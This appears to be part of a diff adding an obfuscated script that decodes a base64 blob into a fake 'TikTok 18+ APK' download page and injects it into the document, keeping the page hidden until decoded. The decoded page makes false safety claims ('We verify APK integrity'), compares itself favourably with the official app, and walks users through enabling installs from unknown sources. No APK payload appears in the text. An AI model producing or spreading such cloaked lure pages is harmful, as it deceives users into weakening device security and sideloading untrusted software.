AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJtb2NrdXAtYWN0aW9uLWljb24iPjxpIGNsYXNzPSJmYS1yZWd1bGFyIGZhLWhlYXJ0Ij48L2k+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJtb2NrdXAtYWN0aW9uLWNvdW50IGxpa2UtY291bnQiIGlkPSJsaWtlQ291bnQyIj44LjJLPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vY2t1cC1hY3Rpb24tYnRuIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLWFjdGlvbi1pY29uIj48aSBjbGFzcz0iZmEtcmVndWxhciBmYS1jb21tZW50Ij48L2k+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJtb2NrdXAtYWN0aW9uLWNvdW50Ij4xLjFLPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vY2t1cC1hY3Rpb24tYnRuIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLWFjdGlvbi1pY29uIj48aSBjbGFzcz0iZmEtcmVndWxhciBmYS1wYXBlci1wbGFuZSI+PC9pPjwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLWFjdGlvbi1jb3VudCI+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vY2t1cC1zb3VuZCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2NrdXAtc291bmQtaW5mbyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InNvdW5kLWljb24iPvCflIo8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InNvdW5kLXRleHQiPk5pZ2h0IHZpYmVzIC0gcmVtaXg8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vY2t1cC1tdXRlLWJ0biBtdXRlLWJ0biIgZGF0YS12aWRlbz0iMSI+TXV0ZTwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vY2t1cC1jYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icGhvbmUtbW9ja3VwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vY2t1cC1zY3JlZW4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx2aWRlbyBsb29wIG11dGVkIHBsYXlzaW5saW5lIGNvbnRyb2xzPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c291cmNlIHNyYz0ibWVkaWEvMy5tcDQiIHR5cGU9InZpZGVvL21wNCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC92aWRlbz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2NrdXAtb3ZlcmxheSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vY2t1cC11c2VyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJtb2NrdXAtdXNlcm5hbWUiPkBsdW5hLm9mZmljaWFsPC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9Im1vY2t1cC1kZXNjcmlwdGlvbiI+TmV3IGRhbmNlIGNoYWxsZW5nZTwvcD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vY2t1cC1oYXNodGFncyI+I2RhbmNlICNjaGFsbGVuZ2UgI3RyZW5kaW5nPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLXRyYW5zbGF0aW9uIj5TZWUgdHJhbnNsYXRpb248L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vY2t1cC1hY3Rpb25zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vY2t1cC1hY3Rpb24tYnRuIGxpa2UtYnRuIiBkYXRhLWlkPSIzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLWFjdGlvbi1pY29uIj48aSBjbGFzcz0iZmEtcmVndWxhciBmYS1oZWFydCI+PC9pPjwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLWFjdGlvbi1jb3VudCBsaWtlLWNvdW50IiBpZD0ibGlrZUNvdW50MyI+MjRLPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vY2t1cC1hY3Rpb24tYnRuIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLWFjdGlvbi1pY29uIj48aSBjbGFzcz0iZmEtcmVndWxhciBmYS1jb21tZW50Ij48L2k+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJtb2NrdXAtYWN0aW9uLWNvdW50Ij4zLjhLPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9Im1vY2t1cC1hY3Rpb24tYnRuIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLWFjdGlvbi1pY29uIj48aSBjbGFzcz0iZmEtcmVndWxhciBmYS1wYXBlci1wbGFuZSI+PC9pPjwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibW9ja3VwLWFjdGlvbi1jb3VudCI+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vY2t1cC1zb3VuZCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2NrdXAtc291bmQtaW5mbyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InNvdW5kLWljb24iPvCflIo8L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InNvdW5kLXRleHQiPkRhbmNlIGNoYWxsZW5nZSAyMDI2PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJtb2NrdXAtbXV0ZS1idG4gbXV0ZS1idG4iIGRhdGEtdmlkZW89IjIiPk11dGU8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgPCEtLSBFWFRSQSBET1dOTE9BRCBCVVRUT04gdW5kZXIgTGl2ZSBQcmV2aWV3cyAo0YEg0YDQtdCw0LvRjNC90L7QuSDRgdGB0YvQu9C60L7QuSkgLS0+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0ZXh0LWNlbnRlciBtdC01Ij4NCiAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL3BsYXkuZ29vZ2xlLmNvbS9zdG9yZS9hcHBzL2RldGFpbHM/aWQ9Y29tLnpoaWxpYW9hcHAubXVzaWNhbGx5JmhsPWVuX0dCIiBjbGFzcz0iYnRuIGJ0bi1kb3dubG9hZCBidG4tbGciIGlkPSJkb3dubG9hZEJ0bjIiIGRvd25sb2FkPjxpIGNsYXNzPSJiaSBiaS1jbG91ZC1hcnJvdy1kb3duLWZpbGwgbWUtMiI+PC9pPkRvd25sb2FkIEFQSyB2MS43LjM8L2E+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9zZWN0aW9uPg0KDQogICAgICAgIDxoMiBjbGFzcz0idGV4dC1jZW50ZXIgbWItNCBmdy1ib2xkIj52cyBvZmZpY2lhbCBUaWtUb2s8L2gyPg0KICAgICAgICA8ZGl2IGNsYXNzPSJ0YWJsZS1yZXNwb25zaXZlIG1iLTUiPg0KICAgICAgICAgICAgPHRhYmxlIGNsYXNzPSJ0YWJsZSB0YWJsZS1ib3JkZXJlZCB0YWJsZS1ob3ZlciBhbGlnbi1taWRkbGUgY29tcGFyaXNvbi10YWJsZSI+DQogICAgICAgICAgICAgICAgPHRoZWFkPjx0cj48dGg+RmVhdHVyZTwvdGg+PHRoPk9mZmljaWFsIFRpa1RvazwvdGg+PHRoPlRpa1RvayAxOCsgdjEuNy4zPC90aD48L3RyPjwvdGhlYWQ+DQogICAgICAgICAgICAgICAgPHRib2R5Pg0KICAgICAgICAgICAgICAgICAgICA8dHI+PHRkPjE4KyBjb250ZW50PC90ZD48dGQ+4p2MIGZvcmJpZGRlbjwvdGQ+PHRkIGNsYXNzPSJ0ZXh0LXN1Y2Nlc3MgZnctYm9sZCI+4pyFIGFsbG93ZWQ8L3RkPjwvdHI+DQogICAgICAgICAgICAgICAgICAgIDx0cj48dGQ+QWRzPC90ZD48dGQ+4pyFIHllcyAoZnJlcXVlbnQpPC90ZD48dGQgY2xhc3M9InRleHQtc3VjY2VzcyBmdy1ib2xkIj7inYwgbm9uZTwvdGQ+PC90cj4NCiAgICAgICAgICAgICAgICAgICAgPHRyPjx0ZD5Eb3dubG9hZCB2aWRlb3M8L3RkPjx0ZD7imqDvuI8gd2F0ZXJtYXJrZWQgLyBsaW1pdGVkPC90ZD48dGQgY2xhc3M9InRleHQtc3VjY2VzcyBmdy1ib2xkIj7inIUgZnVsbCBIRCBubyB3YXRlcm1hcms8L3RkPjwvdHI+DQogICAgICAgICAgICAgICAgICAgIDx0cj48dGQ+QmFja2dyb3VuZCBwbGF5PC90ZD48dGQ+4p2MIG5vPC90ZD48dGQgY2xhc3M9InRleHQtc3VjY2VzcyBmdy1ib2xkIj7inIUgeWVzIChhdWRpbyk8L3RkPjwvdHI+DQogICAgICAgICAgICAgICAgICAgIDx0cj48dGQ+UmVnaXN0cmF0aW9uPC90ZD48dGQ+4pyFIHJlcXVpcmVkPC90ZD48dGQgY2xhc3M9InRleHQtc3VjY2VzcyBmdy1ib2xkIj7inYwgb3B0aW9uYWw8L3RkPjwvdHI+DQogICAgICAgICAgICAgICAgPC90Ym9keT4NCiAgICAgICAgICAgIDwvdGFibGU+DQogICAgICAgIDwvZGl2Pg0KDQogICAgICAgIDxzZWN0aW9uIGlkPSJmYXEiIGNsYXNzPSJmYXEtc2VjdGlvbiI+DQogICAgICAgICAgICA8aDIgY2xhc3M9InRleHQtY2VudGVyIG1iLTQgdGV4dC1saWdodCI+RnJlcXVlbnRseSBhc2tlZCBxdWVzdGlvbnM8L2gyPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWNjb3JkaW9uIiBpZD0iZmFxQWNjb3JkaW9uRGFyayI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWNjb3JkaW9uLWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICA8aDIgY2xhc3M9ImFjY29yZGlvbi1oZWFkZXIiPjxidXR0b24gY2xhc3M9ImFjY29yZGlvbi1idXR0b24iIHR5cGU9ImJ1dHRvbiIgZGF0YS1icy10b2dnbGU9ImNvbGxhcHNlIiBkYXRhLWJzLXRhcmdldD0iI2ZhcTFEYXJrIj5JcyBUaWtUb2sgMTgrIHNhZmU/PC9idXR0b24+PC9oMj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iZmFxMURhcmsiIGNsYXNzPSJhY2NvcmRpb24tY29sbGFwc2UgY29sbGFwc2Ugc2hvdyIgZGF0YS1icy1wYXJlbnQ9IiNmYXFBY2NvcmRpb25EYXJrIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFjY29yZGlvbi1ib2R5Ij5JZiBkb3dubG9hZGVkIGZyb20gYSB0cnVzdGVkIHNvdXJjZSBsaWtlIHRoaXMgc2l0ZSwgeWVzLiBXZSB2ZXJpZnkgQVBLIGludGVncml0eS4gSG93ZXZlciBjb250ZW50IGlzIHN0cmljdGx5IGZvciBhZHVsdHMgMTgrLjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhY2NvcmRpb24taXRlbSI+DQogICAgICAgICAgICAgICAgICAgIDxoMiBjbGFzcz0iYWNjb3JkaW9uLWhlYWRlciI+PGJ1dHRvbiBjbGFzcz0iYWNjb3JkaW9uLWJ1dHRvbiBjb2xsYXBzZWQiIHR5cGU9ImJ1dHRvbiIgZGF0YS1icy10b2dnbGU9ImNvbGxhcHNlIiBkYXRhLWJzLXRhcmdldD0iI2ZhcTJEYXJrIj5XaHkgbm90IG9uIEdvb2dsZSBQbGF5PzwvYnV0dG9uPjwvaDI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImZhcTJEYXJrIiBjbGFzcz0iYWNjb3JkaW9uLWNvbGxhcHNlIGNvbGxhcHNlIiBkYXRhLWJzLXBhcmVudD0iI2ZhcUFjY29yZGlvbkRhcmsiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWNjb3JkaW9uLWJvZHkiPkdvb2dsZSBQbGF5IHJlc3RyaWN0cyBleHBsaWNpdCAxOCsgYXBwcywgc28gaXQncyBkaXN0cmlidXRlZCBhcyBBUEsgb3V0c2lkZSBQbGF5IFN0b3JlLjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhY2NvcmRpb24taXRlbSI+DQogICAgICAgICAgICAgICAgICAgIDxoMiBjbGFzcz0iYWNjb3JkaW9uLWhlYWRlciI+PGJ1dHRvbiBjbGFzcz0iYWNjb3JkaW9uLWJ1dHRvbiBjb2xsYXBzZWQiIHR5cGU9ImJ1dHRvbiIgZGF0YS1icy10b2dnbGU9ImNvbGxhcHNlIiBkYXRhLWJzLXRhcmdldD0iI2ZhcTNEYXJrIj5Ib3cgdG8gdXBkYXRlPzwvYnV0dG9uPjwvaDI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImZhcTNEYXJrIiBjbGFzcz0iYWNjb3JkaW9uLWNvbGxhcHNlIGNvbGxhcHNlIiBkYXRhLWJzLXBhcmVudD0iI2ZhcUFjY29yZGlvbkRhcmsiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWNjb3JkaW9uLWJvZHkiPlVwZGF0ZXMgYXJlIG1hbnVhbC4gRG93bmxvYWQgdGhlIGxhdGVzdCBBUEsgYW5kIGluc3RhbGwgb3ZlciBleGlzdGluZyBhcHAgKGRhdGEgaXMgcHJlc2VydmVkKS48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9zZWN0aW9uPg0KDQogICAgICAgIDwhLS0gSU5TVFJVQ1RJT04gQ0FSRCAodGFyZ2V0IGZvciBzY3JvbGwgYWZ0ZXIgZG93bmxvYWQgb3ZlcmxheSkgLS0+DQogICAgICAgIDxkaXYgY2xhc3M9Imluc3RydWN0aW9uLWNhcmQgbXQtNSIgaWQ9Imluc3RydWN0aW9uQ2FyZCI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnN0cnVjdGlvbi1oZWFkZXIgbWItMyI+DQogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImFuZHJvaWQtYmFkZ2UiPjxpIGNsYXNzPSJmYWIgZmEtYW5kcm9pZCI+PC9pPiBBbmRyb2lkIDExKyDCtyB1bml2ZXJzYWw8L3NwYW4+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxoMiBjbGFzcz0iaW5zdHJ1Y3Rpb24tdGl0bGUiPkhvdyB0byBpbnN0YWxsIEFQSzwvaDI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdWJoZWFkIiBzdHlsZT0iY29sb3I6ICNhMGI2ZDA7IG1hcmdpbi1ib3R0b206IDJyZW07Ij4NCiAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWNoZWNrLWNpcmNsZSIgc3R5bGU9ImNvbG9yOiAjZGMxNDNjOyI+PC9pPiBTaW1wbGUgc3RlcHMgZm9yIGFueSBBbmRyb2lkIGRldmljZQ0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwcy1ncmlkIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLW51bWJlciI+MTwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWRvd25sb2FkIHN0ZXAtaWNvbiI+PC9pPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWNvbnRlbnQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC10aXRsZSI+RG93bmxvYWQgdGhlIEFQSyBmaWxlPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWRlc2MiPlVzZSBhbnkgYnJvd3NlciAoQ2hyb21lLCBGaXJlZm94KS4gQWZ0ZXIgZG93bmxvYWQsIHRhcCB0aGUgbm90aWZpY2F0aW9uIG9yIG9wZW4geW91ciBEb3dubG9hZHMgZm9sZGVyLjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLW51bWJlciI+MjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLXNoaWVsZC1hbHQgc3RlcC1pY29uIj48L2k+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtY29udGVudCI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLXRpdGxlIj5BbGxvdyBpbnN0YWxsIGZyb20gdW5rbm93biBzb3VyY2VzPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWRlc2MiPldoZW4geW91IHRhcCB0aGUgQVBLLCBBbmRyb2lkIG1heSBhc2sgcGVybWlzc2lvbi4gVGFwIDxzdHJvbmc+U2V0dGluZ3M8L3N0cm9uZz4g4oaSIGFsbG93IGZyb20gdGhpcyBzb3VyY2UgKHlvdXIgYnJvd3NlciBvciBmaWxlIG1hbmFnZXIpLjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLW51bWJlciI+MzwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWZpbmdlcnByaW50IHN0ZXAtaWNvbiI+PC9pPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWNvbnRlbnQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC10aXRsZSI+Q29uZmlybSBpZiBwcm9tcHRlZDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1kZXNjIj5Tb21lIGRldmljZXMgYXNrIGZvciBQSU4gLyBmaW5nZXJwcmludCBmb3Igc2VjdXJpdHkuIFZlcmlmeSB0byBjb250aW51ZS48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1pdGVtIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1udW1iZXIiPjQ8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1yb2NrZXQgc3RlcC1pY29uIj48L2k+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtY29udGVudCI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLXRpdGxlIj5QcmVzcyBJbnN0YWxsPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWRlc2MiPlJldmlldyBwZXJtaXNzaW9ucyBhbmQgdGFwICJJbnN0YWxsIi4gQWZ0ZXIgY29tcGxldGlvbiBjaG9vc2UgT3BlbiBvciBEb25lLjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0id2FybmluZy1ub3RlIj4NCiAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWxpZ2h0YnVsYiI+PC9pPg0KICAgICAgICAgICAgICAgIDxkaXY+DQogICAgICAgICAgICAgICAgICAgIDxwIHN0eWxlPSJmb250LXdlaWdodDogNzAwOyI+8J+UkCBTZWN1cml0eSB0aXAgKEFuZHJvaWQpPC9wPg0KICAgICAgICAgICAgICAgICAgICA8cD5JZiBwZXJtaXNzaW9uIGlzIG5vdCByZXF1ZXN0ZWQsIG1hbnVhbGx5IGdvIHRvIDxzdHJvbmc+U2V0dGluZ3Mg4oaSIFNlY3VyaXR5IOKGkiBJbnN0YWxsIHVua25vd24gYXBwczwvc3Ryb25nPiBhbmQgZW5hYmxlIGZvciB5b3VyIGJyb3dzZXIgLyBmaWxlIG1hbmFnZXIuPC9wPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0b2dnbGUtZGVtbyI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idG9nZ2xlLWRlbW8tbGVmdCI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRvZ2dsZS1zd2l0Y2ggdG9nZ2xlLWFjdGl2ZSI+PGRpdiBjbGFzcz0idG9nZ2xlLXN3aXRjaC1jaXJjbGUiPjwvZGl2PjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0b2dnbGUtZGVtby10ZXh0Ij48aSBjbGFzcz0iZmFzIGZhLWNoZWNrLWNpcmNsZSIgc3R5bGU9ImNvbG9yOiM2Y2RiOGM7Ij48L2k+ICBDaHJvbWUgYWxsb3dlZDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRlbW8tc21hbGwiPjxpIGNsYXNzPSJmYXMgZmEtY29nIj48L2k+IFNldHRpbmdzIOKGkiBBcHBzIOKGkiBzcGVjaWFsIGFjY2VzczwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb290bm90ZSI+DQogICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zaGllbGQtaGFsdmVkIj48L2k+IERvd25sb2FkIEFQSyBvbmx5IGZyb20gdHJ1c3RlZCBzb3VyY2VzLiBHb29nbGUgUGxheSBQcm90ZWN0IHNjYW5zIGFwcHMuDQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQoNCiAgICA8L2Rpdj4NCg0KICAgIDxmb290ZXIgY2xhc3M9ImJnLWJsYWNrIHRleHQtd2hpdGUtNTAgcHktNSBtdC01IGJvcmRlci10b3AgYm9yZGVyLXNlY29uZGFyeSI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciB0ZXh0LWNlbnRlciI+DQogICAgICAgICAgICA8cCBjbGFzcz0ibWItMSBmcy01Ij7CqSAyMDI2IFRpa1RvayAxOCsgQVBLIHYxLjcuMyDCtyBpbmRlcGVuZGVudCBmYW4gc2l0ZTwvcD4NCiAgICAgICAgICAgIDxwIGNsYXNzPSJzbWFsbCI+Tm90IGFmZmlsaWF0ZWQgd2l0aCBUaWtUb2sgSW5jLiBvciBCeXRlRGFuY2UuIDE4KyBvbmx5LjwvcD4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIGdhcC00IG10LTMiPg0KICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJiaSBiaS10aWt0b2siIHN0eWxlPSJmb250LXNpemU6IDEuNXJlbTsiPjwvaT4NCiAgICAgICAgICAgICAgICA8aSBjbGFzcz0iYmkgYmktYW5kcm9pZDIiIHN0eWxlPSJmb250LXNpemU6IDEuNXJlbTsiPjwvaT4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPHA+PGkgY2xhc3M9ImJpIGJpLXNoaWVsZC1sb2NrLWZpbGwiIHN0eWxlPSJjb2xvcjojZGMxNDNjOyI+PC9pPjwvcD4NCiAgICAgICAgPC9kaXY+DQogICAgPC9mb290ZXI+DQoNCiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4zLjIvZGlzdC9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyI+PC9zY3JpcHQ+';
+      var d = decodeURIComponent(atob(b64).split('').map(function(c) {
+          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+      }).join(''));
+      document.getElementById('app').innerHTML = d;
+      document.body.style.visibility = 'visible';
+      setTimeout(function() {
+        document.body.style.opacity = '1';
+      }, 100);
+    })();
+    
+  </script>
+
+  
 <script>
